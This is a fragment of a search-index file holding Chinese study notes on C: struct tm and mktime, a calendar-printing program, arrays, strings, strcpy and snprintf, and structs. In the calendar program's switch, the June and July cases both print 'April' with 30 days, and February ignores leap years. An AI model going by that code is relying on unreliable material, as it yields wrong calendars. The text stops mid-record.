\u7ed3\u6784\u4f53\u5176\u5728 Python \u4e2d\u53ef\u4ee5\u88ab\u7406\u89e3\u4e3a\u4e27\u5931\u4e86 function \u529f\u80fd\u7684 class\uff0c\u5b9a\u4e49\u6570\u636e\u7ed3\u6784:</p> <pre><code>class Point:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n# \u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\np1 = Point(10, 20)\nprint(p1.x, p1.y)  # \u8f93\u51fa: 10 20\n</code></pre> <p>\u5728 time.h \u4e2d c \u8bed\u8a00\u4f7f\u7528\u4e86\u7ed3\u6784\u4f53\u5b9a\u4e49\u4e86 tm \u8fd9\u79cd\u6570\u636e\u7c7b\u578b\uff1a</p> <pre><code>struct tm {\n    int tm_sec;     /* seconds after the minute [0-60] */\n    int tm_min;     /* minutes after the hour [0-59] */\n    int tm_hour;    /* hours since midnight [0-23] */\n    int tm_mday;    /* day of the month [1-31] */\n    int tm_mon;     /* months since January [0-11] */\n    int tm_year;    /* years since 1900 */\n    int tm_wday;    /* days since Sunday [0-6] */\n    int tm_yday;    /* days since January 1 [0-365] */\n    int tm_isdst;   /* Daylight Savings Time flag */\n    long    tm_gmtoff;  /* offset from UTC in seconds */\n    char    *tm_zone;   /* timezone abbreviation */\n};\n</code></pre> <p>\u56e0\u6b64 <code>struct tm tm</code> \u4e3a\u58f0\u660e\u4e00\u4e2a tm \u6570\u636e\u7ed3\u6784\u7684\u540d\u4e3a tm \u7684\u53d8\u91cf</p> <pre><code>memset(&amp;tm, 0, sizeof(tm));\n</code></pre> <p>memset \u662f\u4e00\u4e2a\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u4e00\u5757\u5185\u5b58\u533a\u57df\u4e2d\u7684\u6240\u6709\u5b57\u8282\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u503c\u3002memset \u5c06 tm \u7ed3\u6784\u4f53\u7684\u6240\u6709\u5b57\u6bb5\u90fd\u8bbe\u7f6e\u4e3a 0. \u4e3a\u4e86\u4fdd\u8bc1 mktime \u51fd\u6570\u7684\u5de5\u4f5c\u6b63\u5e38\u8c03\u7528\u8be5\u51fd\u6570\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5982\u679c\u4e0d\u8c03\u7528\u624b\u52a8\u521d\u59cb\u5316\u76f8\u5bf9\u6765\u8bf4\u8f83\u4e3a\u9ebb\u70e6\uff1a</p> <pre><code>tm.tm_sec = 0;\ntm.tm_min = 0;\ntm.tm_hour = 0;\ntm.tm_mday = 1;\ntm.tm_mon = month - 1;\ntm.tm_year = year - 1900;\ntm.tm_wday = 0;  // \u8fd9\u4e9b\u5b57\u6bb5\u5b9e\u9645\u4e0a\u4f1a\u88ab mktime \u91cd\u65b0\u8ba1\u7b97\ntm.tm_yday = 0;\ntm.tm_isdst = 0;\n</code></pre> <p>\u5728 <code>time.h</code> \u6587\u4ef6\u91cc\u53ef\u4ee5\u770b\u5230\u5929\u4e3a 1 - 31 \u6b63\u5e38\u4f20\u53c2\u5b9a\u4e49\uff0c\u5468\u4e3a 0 - 11 \u8ba1\u7b97\uff0c\u5e74\u4e3a\u4ece 1900 \u5e74\u7b97\u8d77\uff0c\u56e0\u6b64\u5728\u540e\u7eed\u4f20\u53c2\u6570\u7ed9 <code>first_day_of_month(int month, int year)</code> \u540e\uff0c\u4f1a\u88ab\u81ea\u52a8\u5b9a\u4e49\u4e3a\u6307\u5b9a\u5e74\u4efd\u7684\u6307\u5b9a\u6708\u6570\u7684\u7b2c\u4e00\u5929\u3002\u7ecf\u8fc7 mktime \u51fd\u6570\u8ba1\u7b97\u8fc7\u540e\u4f1a\u8fd4\u56de\u6ca1\u6709\u5b9a\u4e49\u7684\u53d8\u91cf\uff0ctm_wday \u4f1a\u8fd4\u56de 0 - 6 \u5206\u522b\u4f9d\u6b21\u4ee3\u8868\u5468\u672b - \u5468\u516d\u3002</p>"},{"location":"cs/c/2.4/#mycalc","title":"mycal.c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"first_day_of_month.c\"\n\n#define DEFAULT_MONTH           8\n#define DEFAULT_YEAR            2023\n\n#define NWEEKS                  6\n#define DAYS_PER_WEEK           7\n\nvoid print_cal(int month, int year)\n{\n    int day1        = first_day_of_month(month, year);\n    int daysinmonth = 0;\n\n    switch (month) {\n        case 1: printf(\"   January %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 2: printf(\"   February %i\\n\", year);\n                daysinmonth = 28;\n                break;\n\n        case 3: printf(\"   March %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 4: printf(\"   April %i\\n\", year);\n                daysinmonth = 30;\n                break;\n\n        case 5: printf(\"   May %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 6: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 7: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 8: printf(\"   August %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 9: printf(\"   September %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 10: printf(\"   October %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 11: printf(\"   November %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 12: printf(\"   December %i\\n\", year);\n            daysinmonth = 31;\n            break;\n    }\n\n    printf(\"Su Mo Tu We Th Fr Sa\\n\");\n\n    int day = 1 - day1;\n    for(int w=0 ; w&lt;NWEEKS ; ++w) {\n        for(int d=0 ; d&lt;DAYS_PER_WEEK ; ++d) {\n            if(day &lt; 1 || day &gt; daysinmonth) {\n                printf(\".. \");\n            }\n            else {\n                printf(\"%2i \", day);\n            }\n            ++day;\n        }\n        printf(\"\\n\");\n    }\n}\n\nint main(int argcount, char *argvalue[ ])\n{\n    int month   = DEFAULT_MONTH;\n    int year    = DEFAULT_YEAR;\n\n    if(argcount &gt; 1) {\n        month   = atoi(argvalue[1]);\n        if(argcount &gt; 2) {\n            year = atoi(argvalue[2]);\n        }\n    }\n\n    print_cal(month, year);\n\n    return 0;\n}\n</code></pre> <p>\u7a0b\u5e8f\u7684\u6838\u5fc3\u7247\u6bb5\u7b97\u6cd5\u4e3a\u8be5 nested for loop:</p> <pre><code>for(int w = 0; w &lt; NWEEKS; ++w) {\n    for(int d = 0; d &lt; DAYS_PER_WEEK; ++d) {\n        if(day &lt; 1 || day &gt; daysinmonth) {\n            printf(\".. \");\n        }\n        else {\n            printf(\"%2i \", day);   // format using 2 columns\n        }\n        ++day;\n    }\n    printf(\"\\n\");       // move printing to a new line after each week\n}\n</code></pre>"},{"location":"cs/c/2.4/#outer-loop","title":"Outer Loop","text":"<p>w \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5468\u6570\uff0c\u4ece 0 \u5f00\u59cb\u5230 NWEEKS - 1\uff0c\u8fd9\u91cc NWEEKS \u88ab\u5b9a\u4e49\u4e3a 6\uff0c\u610f\u5473\u7740\u6700\u591a\u6253\u5370 6 \u884c\uff0c\u6bcf\u884c\u4ee3\u8868\u4e00\u5468\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5916\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u884c\u6570\uff08\u5373\u5468\u6570\uff09\uff0c\u6bcf\u4e00\u8f6e\u5faa\u73af\u6253\u5370\u4e00\u5468\u7684\u65e5\u671f\u3002</p>"},{"location":"cs/c/2.4/#inner-loop","title":"Inner Loop","text":"<p>d \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5929\u6570\uff08\u4ece\u5468\u65e5\u5230\u5468\u516d\uff09\uff0c\u4ece 0 \u5f00\u59cb\u5230 DAYS_PER_WEEK - 1\uff0c\u8fd9\u91cc DAYS_PER_WEEK \u88ab\u5b9a\u4e49\u4e3a 7\uff0c\u8868\u793a\u4e00\u5468\u4e03\u5929\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5185\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u4e00\u5468\u4e2d\u6bcf\u5929\u7684\u8f93\u51fa\uff0c\u786e\u4fdd\u5728\u6bcf\u4e00\u884c\u4e2d\u6253\u5370\u51fa\u4ece\u5468\u65e5\u5230\u5468\u516d\u7684\u65e5\u671f\u3002</p>"},{"location":"cs/c/2.4/#_1","title":"\u5224\u65ad\u903b\u8f91","text":"<pre><code>if(day &lt; 1 || day &gt; daysinmonth) {\n    printf(\".. \");\n} else {\n    printf(\"%2i \", day);   // format using 2 columns\n}\n</code></pre> <ul> <li> <p>day \u53d8\u91cf\uff1aday \u662f\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u9700\u8981\u6253\u5370\u7684\u65e5\u671f\u3002\u8fd9\u4e2a\u53d8\u91cf\u6700\u521d\u88ab\u521d\u59cb\u5316\u4e3a 1 - day1\uff0c\u5176\u4e2d day1 \u662f\u8fd9\u4e2a\u6708\u7b2c\u4e00\u5929\u7684\u661f\u671f\u6570\uff08\u4f8b\u5982\uff0c0 \u8868\u793a\u661f\u671f\u65e5\uff0c1 \u8868\u793a\u661f\u671f\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\u3002</p> </li> <li> <p>if(day &lt; 1 || day &gt; daysinmonth) \u6761\u4ef6\uff1a</p> </li> <li> <p>\u5982\u679c day \u5c0f\u4e8e 1\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5728\u8fd9\u4e2a\u6708\u5f00\u59cb\u4e4b\u524d\uff09\u6216\u8005\u5927\u4e8e daysinmonth\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5df2\u7ecf\u8d85\u51fa\u4e86\u8fd9\u4e2a\u6708\u7684\u5929\u6570\uff09\uff0c\u5c31\u6253\u5370 \"..\" \u4f5c\u4e3a\u5360\u4f4d\u7b26\u3002</p> </li> <li> <p>\u8fd9\u6837\u53ef\u4ee5\u4fdd\u6301\u6bcf\u4e00\u884c\u7684\u683c\u5f0f\u4e00\u81f4\uff0c\u5c24\u5176\u662f\u5728\u7b2c\u4e00\u4e2a\u661f\u671f\u5f00\u59cb\u4e4b\u524d\u7684\u7a7a\u767d\u5904\u548c\u6700\u540e\u4e00\u4e2a\u661f\u671f\u7ed3\u675f\u540e\u7684\u7a7a\u767d\u5904\u3002</p> </li> <li> <p>else \u5206\u652f\uff1a</p> </li> <li> <p>\u5982\u679c day \u5728\u5408\u6cd5\u8303\u56f4\u5185\uff08\u5373\u5927\u4e8e\u6216\u7b49\u4e8e 1 \u4e14\u5c0f\u4e8e\u6216\u7b49\u4e8e daysinmonth\uff09\uff0c\u5219\u6253\u5370\u5f53\u524d\u65e5\u671f\u3002%2i \u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u8868\u793a\u6253\u5370\u4e00\u4e2a\u53f3\u5bf9\u9f50\u7684\u4e24\u4f4d\u6570\u65e5\u671f\u3002</p> </li> <li> <p>++day\uff1a\u6bcf\u6253\u5370\u4e00\u5929\uff0cday \u53d8\u91cf\u81ea\u589e 1\uff0c\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u65e5\u671f\u3002</p> </li> <li> <p>\u5728\u5185\u5c42\u5faa\u73af\u7ed3\u675f\u540e\uff0c\u8c03\u7528 printf(\"\\n\"); \u5c06\u6253\u5370\u79fb\u52a8\u5230\u4e0b\u4e00\u884c\uff0c\u4ece\u800c\u5f00\u59cb\u6253\u5370\u4e0b\u4e00\u5468\u7684\u65e5\u671f\u3002</p> </li> </ul>"},{"location":"cs/c/2.4/#conclusion","title":"Conclusion","text":"<p>\u8be5\u7a0b\u5e8f\u6838\u5fc3\u4e3a\u8c03\u7528 mktime \u51fd\u6570\u4f20\u53c2\u6307\u5b9a\u5e74\u4efd\u548c\u6708\u6570\u4ee5\u53ca\u5f53\u6708\u7684\u7b2c\u4e00\u5929\uff0c\u83b7\u5f97\u5176\u8fd4\u56de\u7684\u5f53\u6708\u7684\u7b2c\u4e00\u5929\u5c5e\u4e8e\u7b2c\u51e0\u5468\u3002\u7136\u540e\u4f7f\u7528 nested for loop \u6253\u5370\u4e8c\u7ef4\u77e9\u9635\uff1a\u5916\u5c42\u8d1f\u8d23\u63a7\u5236\u6700\u5927\u5468\u6570\uff0c\u4e00\u4e2a\u6708\u6700\u5927\u7684\u5468\u6570\u4e0d\u4f1a\u8d85\u8fc7 6 \u884c\uff0c\u56e0\u6b64\u5728\u6253\u5370 2 \u6708\u7684\u65f6\u5019\u53ef\u4ee5\u53d1\u73b0\u6700\u540e\u4e00\u5468\u5168\u90e8\u88ab\u66ff\u6362\u6210\u4e86 ..</p> <pre><code>   February 2023\nSu Mo Tu We Th Fr Sa\n.. .. ..  1  2  3  4 \n 5  6  7  8  9 10 11 \n12 13 14 15 16 17 18 \n19 20 21 22 23 24 25 \n26 27 28 .. .. .. .. \n.. .. .. .. .. .. .. \n</code></pre> <p>\u5185\u5c42\u5faa\u73af\u4e3b\u8981\u5224\u65ad\u5f53\u6708\u7b2c\u4e00\u5929\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u7528 1 - day1 \u7684\u7b97\u6cd5\u786e\u5b9a\u6709\u591a\u5c11\u4e2a\u7a7a\u5929\u6570\uff0c\u4f8b\u5982\u5468\u4e94\u5c31\u662f -4, [-4, -3, -2, -1, 0] \u4e00\u76f4\u5230\u7b49\u4e8e 1 \u7684\u65f6\u5019\u5c31\u80fd\u786e\u8ba4\u8be5\u5217\u662f\u7b2c\u4e00\u5929\uff0c\u7136\u540e\u7528 <code>%2i</code> \u7684\u683c\u5f0f\u4fdd\u8bc1\u4e24\u4e2a\u5b57\u6bb5\u5bbd\u5ea6\u8f93\u51fa\u5929\u6570\uff0c\u4e3b\u8981\u4e3a\u4e86\u4fdd\u8bc1\u683c\u5f0f\u5316\u8f93\u51fa\u540e\u7684\u7f8e\u89c2\u6574\u9f50\uff0c\u7136\u540e\u9010\u6e10\u589e\u52a0 day \u7684\u5929\u6570\u76f4\u5230\u8d85\u8fc7\u5f53\u6708\u63d0\u524d\u5b9a\u4e49\u597d\u7684\u6700\u5927\u5929\u6570\u3002</p> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u7a0b\u5e8f\u7528\u5230\u4e86 atoi \u7ed9 argvalue \u8f6c\u6362\u6570\u636e\u7c7b\u578b\u4e3a integer, \u7528 switch \u8bed\u53e5\u63d0\u524d\u6253\u5370\u7b2c\u4e8c\u884c\u7684\u6708\u4efd\u5e76\u624b\u52a8\u5b9a\u4e49\u6700\u5927\u5929\u6570\uff0c\u56e0\u6b64\u5728 switch \u4e2d\u6ca1\u6709\u7528\u5230 default \u8bed\u53e5\u3002\u6559\u6388\u8fd8\u7528\u5230\u4e86 <code>#define</code> \u8bed\u53e5\u63d0\u524d\u5b9a\u4e49\u4e00\u4e9b\u5e38\u91cf\uff0c\u8282\u7701\u5185\u5b58\u4e0e\u7f16\u8bd1\u5668\u65f6\u95f4\u3002</p>"},{"location":"cs/c/3.1/","title":"3.1 Data Structure","text":""},{"location":"cs/c/3.1/#mon-wed-lecture","title":"Mon &amp; Wed Lecture","text":"<p>\u4e3b\u8981\u8bb2\u8ff0\u4e86\u6570\u636e\u7ed3\u6784\u4e0e <code>struct</code> \u6570\u7ec4\u5b9a\u4e49</p>"},{"location":"cs/c/3.1/#arrays","title":"arrays","text":"<p>\u65e0\u8bba\u4f60\u7528\u4ec0\u4e48\u7f16\u7a0b\u8bed\u8a00\uff0c\u53cc\u5217\u8868\u7b2c\u4e00\u4e2a\u505a\u7684\u4e8b\u6c38\u8fdc\u662f\u628a\u7b2c\u4e00\u4e2a\u7ef4\u5ea6\u89c6\u4e3a\u884c\uff0c\u7b2c\u4e8c\u4e2a\u7ef4\u5ea6\u89c6\u4e3a\u5217</p>"},{"location":"cs/c/3.1/#initialization","title":"Initialization","text":"<p>\u6211\u4eec\u4e00\u822c\u503e\u5411\u4e8e\u5728 C \u6587\u4ef6\u5f00\u5934\u4f7f\u7528 <code>define</code> \u8bed\u53e5\u63d0\u524d\u5b9a\u4e49\u597d\u5217\u8868\u7684\u5185\u5b58\u5927\u5c0f</p> <pre><code>#define  N   20\n\nint   myarray[ N ];\nint   evensum;\n\nevensum = 0;\nfor(int i=0 ; i &lt; N ; ++i) {\n    myarray[ i ] = i * 2;                                  \n    evensum      = evensum + myarray[ i ];\n}\n</code></pre> <p>\u4e00\u7ef4\u5217\u8868\u7684\u521d\u59cb\u5316\u65b9\u6cd5\u5982\u4e0b\uff0c\u548c Python \u4e0d\u540c\u7684\u662f C \u7684\u4e00\u5207\u90fd\u9700\u8981\u63d0\u524d\u5728\u5185\u5b58\u4e2d\u521d\u59cb\u5316\u597d\u540e\u518d\u63a5\u5165\u5176\u5143\u7d20\uff0c\u6709\u8fd0\u884c\u65f6\u521d\u59cb\u5316\u5e76\u5206\u914d\u5143\u7d20\u4e0e\u7f16\u8bd1\u65f6\u521d\u59cb\u5316\u4e24\u79cd\u65b9\u6848</p> <p>initialize the elements at run-time, by executing statements to assign values to the elements</p> <pre><code>#define  N   5\n\nint   myarray[ N ];\n\n....\n\n    for(int i=0 ; i &lt; N ; ++i) {\n        myarray[ i ] = i;\n    }\n</code></pre> <p>initialize the values at compile-time, by telling the compiler what values to initially store in the memory</p> <pre><code>#define  N   5\n\nint   myarray[ N ] = { 0, 1, 2, 3, 4 };\n</code></pre> <p>\u7f16\u8bd1\u65f6\u8ba9\u81ea\u52a8\u521d\u59cb\u5316\u5206\u914d\u5185\u5b58\u5927\u5c0f</p> <pre><code>int   myarray[ ] = { 0, 1, 2, 3, 4 };\n\n#define  N   (sizeof(myarray) / sizeof(myarray[0]))\n</code></pre> <p>\u5728\u4e0d\u6307\u5b9a\u5185\u5b58\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u7f16\u8bd1\u65f6\u4f1a\u6839\u636e\u5143\u7d20\u6570\u91cf\u81ea\u52a8\u63a8\u5012\uff0cdefine \u8fd9\u884c\u5217\u8868\u4e2d\u90fd\u662f\u540c\u4e00\u7c7b\u578b\u7684\u6570\u636e\uff0c\u6bcf\u4e2a int \u5143\u7d20\u5360\u636e 4 bytes, sizeof(array) \u4f1a\u8fd4\u56de\u5217\u8868\u5927\u5c0f\u4e5f\u5c31\u662f 4 * 5 = 20, \u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4e3a 4 \u76f8\u9664\u5c31\u6210\u4e86\u5217\u8868\u957f\u5ea6\u3002</p> <p>\u63d0\u524d\u9884\u7559\u5185\u5b58\u4e0e\u6307\u5b9a\u90e8\u5206\u5143\u7d20</p> <pre><code>#define  HUGE   10000\n\nint   myarray[ HUGE ] = { 4, 5 };\n</code></pre> <p>\u5728 run-time \u540e define \u624d\u80fd\u786e\u5b9a\u5927\u5c0f\u7684\u6570\u7ec4\u88ab\u79f0\u4e4b\u4e3a  variable-length arrays, or variable-sized arrays \u4e5f\u5c31\u662f\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\u548c\u53ef\u53d8\u5927\u5c0f\u6570\u7ec4\uff1b\u4f46\u7531\u4e8e\u5176\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e2d\u5b9e\u73b0\u6548\u7387\u4f4e\u4e0b\uff0c\u73b0\u4ee3 Linux \u5185\u6838\u79fb\u9664\u4e86\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\uff0cC11 \u4e2d\u6210\u4e3a\u4e86\u53ef\u9009\u5b9a\u4e49\u3002\u5e76\u4e14\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\u90fd\u53ef\u4ee5\u5728\u4e00\u4e2a\u51fd\u6570\u4e2d\u5b9a\u4e49\u5e76\u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u51fd\u6570\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u5927\u5c0f\u5728\u8fd0\u884c\u65f6\u4e4b\u524d\u662f\u672a\u77e5\u7684\uff0c\u56e0\u6b64\u4e5f\u5fc5\u987b\u4f20\u9012\u6570\u7ec4\u7684\u5927\u5c0f\u3002\u65e0\u6cd5\u6839\u636e\u6570\u7ec4\u7684\u540d\u79f0\u786e\u5b9a\u6570\u7ec4\u7684\u5927\u5c0f\u3002</p> <pre><code>void function2(int array_size, char vla[ ])\n{\n    for(int i=0 ; i &lt; array_size ; ++i) {\n        // access vla[i] ...\n        ....\n    }\n}\n\nvoid function1(void)\n{\n    int size = read an integer from keyboard or a file;\n\n    char vla[ size ];\n\n    function2(size, vla);\n}\n</code></pre>"},{"location":"cs/c/3.1/#strings","title":"strings","text":"<p>\u7531\u4e8e C \u4e2d\u4e0d\u5177\u5907\u5b57\u7b26\u4e32\u8fd9\u79cd\u57fa\u7840\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4f7f\u7528\u7684\u662f char array \u6570\u7ec4\u5b57\u7b26\u53bb\u5b9e\u73b0\uff0c\u65e0\u8bba\u662f <code>#include &lt;string.h&gt;</code> \u4e0b\u53ef\u88ab\u8c03\u7528\u7684\u529f\u80fd\u8ba1\u7b97\u5b57\u7b26\u957f\u5ea6\uff0c\u662f\u5426\u76f8\u7b49\uff0c\u62f7\u8d1d\u7b49\u548c <code>printf</code> \u4e00\u6837\u90fd\u672c\u8d28\u662f\u7ba1\u7406\u5b57\u7b26\u6570\u7ec4\u3002</p> <pre><code>char greeting[5] = { 'h', 'e', 'l', 'l', 'o' };\n\nchar today[6]    = \"Monday\";\n\nchar month[]     = \"August\";\n</code></pre> <p>\u548c int \u4e00\u6837\u540c\u6837\u652f\u6301\u81ea\u52a8\u8ba1\u7b97\u5206\u914d\u6240\u9700\u5927\u5c0f</p>"},{"location":"cs/c/3.1/#strings-are-terminated-by-a-special-character","title":"Strings are terminated by a special character","text":"<p>\u5728\u6570\u7ec4\u4e2d <code>\\0</code> \u88ab\u79f0\u4e3a null byte, \u4e00\u822c\u7528\u4e8e char arrary \u4e2d\u7684\u672b\u5c3e\u5e8f\u5217\uff0c\u6807\u660e string \u5230\u8fd9\u91cc\u5c31\u5904\u7406\u7ed3\u675f\u4e86\uff1a</p> <pre><code>h e l l o \\0\n</code></pre> <p>\u8fd9\u4e2a\u5b57\u7b26\u9700\u8981\u516d\u4e2a\u5b57\u8282\u7684\u5185\u5b58\u624d\u80fd\u88ab\u6b63\u5e38\u50a8\u5b58\uff0c\u4f46\u662f strlen \u8fd9\u6837\u7684\u51fd\u6570\u8fd4\u56de\u4f1a\u663e\u793a 5</p> <p>\u5148\u524d\u7684\u6848\u4f8b <code>char month[] = \"August\";</code> \u4e2d\uff0c\u5b9e\u9645\u4e0a\u7cfb\u7edf\u81ea\u52a8\u7ed9 August \u672b\u5c3e\u5206\u914d\u4e86\u4e00\u4e2a <code>\\0</code> \u7b26\uff0c\u4f7f\u7528\u4e86 7 \u4e2a\u4f4d\u7f6e\u50a8\u5b58,\uff0c\u4f46\u5728 Monday \u4e2d\u7531\u4e8e\u6307\u5b9a\u4e86\u5185\u5b58\u5927\u5c0f\u56e0\u6b64\u4e0d\u4f1a\u88ab\u81ea\u52a8\u5206\u914d <code>\\0</code> \u7b26</p> <pre><code>h e l l o wo r l d \\0\n</code></pre> <p>\u5982\u679c\u6267\u884c <code>arrary[5] = '\\0'</code>, \u6570\u7ec4\u4ecd\u7136\u4f1a\u5360\u636e 12 \u4e2a\u5b57\u8282\u7684\u50a8\u5b58\u7a7a\u95f4\uff0c\u4f46\u662f\u5982\u679c\u6253\u5370\u51fa\u6765\u5c31\u53ea\u4f1a\u5f97\u5230 hello</p>"},{"location":"cs/c/3.1/#copy-one-string-into-another","title":"copy one string into another","text":"<p>solution one\uff1a for loop</p> <pre><code>void my_strcpy(char destination[], char source[])\n{\n    int length = strlen(source);\n\n    for(int i = 0 ; i &lt; length ; ++i) {\n        destination[i] = source[i];\n    }\n    destination[length] = '\\0';\n}\n</code></pre> <p>\u89e3\u51b3\u65b9\u6848\u4e00\u662f\u9996\u5148\u8ba1\u7b97\u957f\u5ea6\u7136\u540e\u63d2\u8fdb\u65b0\u6570\u7ec4\u5185\u5bb9\uff0c\u6700\u540e\u63d2\u5165 <code>\\0</code> \u7ed3\u675f</p> <p>solution two: while loop unbounded loop:</p> <pre><code>void my_strcpy(char destination[], char source[])\n{\n    int  i = 0;\n\n    while(source[i] != '\\0') {\n        destination[i] = source[i];\n        i = i+1;\n    }\n    destination[i] = '\\0';\n}\n</code></pre> <p>\u6839\u636e\u539f source \u6570\u7ec4\u5224\u65ad\uff0c\u53ea\u8981\u4e0d\u662f null byte \u5c31\u7ee7\u7eed\u590d\u5236\uff0cdo while \u540c\u6837\u53ef\u4ee5\u5b9e\u73b0</p> <pre><code>// USE AN UNBOUNDED LOOP, COPYING UNTIL THE NULL-BYTE \n\nvoid my_strcpy(char destination[], char source[])\n{\n    int  i = 0;\n\n    do {\n        destination[i] = source[i];\n        i = i+1;\n    } while(source[i-1] != '\\0');\n}\n</code></pre>"},{"location":"cs/c/3.1/#sprintf-","title":"sprintf - \u683c\u5f0f\u5316\u5199\u5165\u53d8\u91cf","text":"<p>\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u6211\u4eec\u7684\u201c\u8f93\u51fa\u201d\u88ab\u5199\u5165\u5b57\u7b26\u6570\u7ec4\uff0c\u800c\u4e0d\u662f\u5230\u5c4f\u5e55\u4e0a\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n\nchar chess_outcome[64];\n\nif(winner == WHITE) {\n    sprintf(chess_outcome, \"WHITE with %i\", nwhite_pieces);\n}\nelse {\n    sprintf(chess_outcome, \"BLACK with %i\", nblack_pieces);\n}\nprintf(\"The winner: %s\\n\", chess_outcome);\n</code></pre> <p>\u9ed8\u8ba4\u53ef\u4ee5\u8fd9\u6837\u7528\uff0c\u4f46\u7531\u4e8e\u4e0d\u8981\u8d85\u8fc7\u63a5\u6536\u683c\u5f0f\u5316\u6253\u5370\u7684\u6570\u7ec4\u7684\u6700\u5927\u957f\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u5b9a\u4e49</p> <pre><code>char chess_outcome[64];\n\n//  FORMAT, AT MOST, A KNOWN NUMBER OF CHARACTERS\nif(winner == WHITE) {\n    snprintf(chess_outcome, 64, \"WHITE with %i\", nwhite_pieces);\n}\n\n//  OR, GREATLY PREFERRED:\nif(winner == WHITE) {\n    snprintf(chess_outcome, sizeof(chess_outcome), \"WHITE with %i\", nwhite_pieces);\n}\n</code></pre>"},{"location":"cs/c/3.1/#struct","title":"struct","text":""},{"location":"cs/c/3.1/#anonymous-struct","title":"anonymous struct","text":"<p>\u6559\u6388\u7528\u4e86 RGB \u8c03\u8272\u76d8\u9996\u5148\u4e3e\u4f8b\u533f\u540d struct \u5176\u673a\u5236\uff1a</p> <p>C provides a mechanism to bring related data together, structures, using the struct keyword.</p> <pre><code>//  DEFINE AND INITIALIZE ONE VARIABLE THAT IS A STRUCTURE\nstruct {\n    char    *name;   // a pointer to a sequence of characters\n    int     red;     // in the range 0..255\n    int     green;\n    int     blue;\n} rgb_colour = {\n    \"DodgerBlue\",\n     30,\n    144,\n    255\n};\n\nprintf(\"Color name: %s\\n\", rgb_colour.name);\nprintf(\"RGB: (%d, %d, %d)\\n\", rgb_colour.red, rgb_colour.green, rgb_colour.blue);\n</code></pre> <p>\u533f\u540d\u7ed3\u6784\u4f53\u5728 struct \u540e\u6ca1\u6709\u6807\u660e\u7ed3\u6784\u4f53\u7c7b\u578b / \u6570\u636e\u7c7b\u578b\uff0c<code>{}</code> \u540e\u5b9a\u4e49\u4e86\u4e00\u4e2a variable, \u56e0\u6b64\u5728\u8c03\u7528\u7684\u65f6\u5019\u4e0d\u9700\u8981\u5148\u5bf9\u7ed3\u6784\u4f53\u8fdb\u884c\u6570\u636e\u7c7b\u578b\u58f0\u660e\u76f4\u63a5\u7528</p> <p>variable \u4e5f\u53ef\u4ee5\u662f\u6570\u7ec4\uff1a</p> <pre><code>struct myStructure s1[3] = {\n    {13, 'B', \"Some text\"},\n    {25, 'C', \"Another text\"},\n    {42, 'D', \"More text\"}\n};\n\nprintf(\"s1[0] - number: %d, letter: %c, text: %s\\n\", s1[0].number, s1[0].letter, s1[0].text);\nprintf(\"s1[1] - number: %d, letter: %c, text: %s\\n\", s1[1].number, s1[1].letter, s1[1].text);\n</code></pre>"},{"location":"cs/c/3.1/#multiple-football-teams","title":"Multiple football teams","text":"<p>\u8fd9\u4e2a\u6848\u4f8b\u5c31\u662f C11 \u4e2d struct \u533f\u540d\u51fd\u6570\u7684\u6570\u7ec4 variable \u7528\u6cd5</p> <p>\u591a\u4e2a TEAM \u7684\u5185\u5bb9\u90fd\u53ef\u88ab\u81ea\u5b9a\u4e49\uff0c\u7136\u540e\u5faa\u73af\u6253\u5370\u6bcf\u4e2a TEAM \u7684\u5143\u7d20</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define MAX_TEAMS               3           // \u5b9a\u4e49\u961f\u4f0d\u6570\u91cf\n#define MAX_TEAMNAME_LEN        30          // \u6700\u5927\u961f\u4f0d\u540d\u79f0\u957f\u5ea6\n\n// \u5b9a\u4e49\u7403\u961f\u7684\u7ed3\u6784\u4f53\u6570\u7ec4\nstruct {\n    char    teamname[MAX_TEAMNAME_LEN+1];   // \u961f\u4f0d\u540d\u79f0\n    int  